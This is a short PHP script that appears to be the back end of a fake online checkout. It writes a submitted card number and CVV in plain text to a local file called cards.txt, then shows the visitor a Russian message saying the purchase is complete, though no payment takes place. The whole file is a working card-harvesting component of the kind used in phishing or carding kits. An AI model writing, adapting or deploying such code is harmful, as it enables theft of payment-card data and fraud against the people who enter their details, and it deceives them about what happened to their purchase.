<?php
	$f = fopen("cards.txt", "a");
	fwrite($f, $_POST['num'] . PHP_EOL);
	fwrite($f, $_POST['cvv']);
	fwrite($f, PHP_EOL . '-----' . PHP_EOL);
	fclose($f);
	echo '<h1>Покупка завершена!</h1><br><a href=".">Назад</a>';
?>
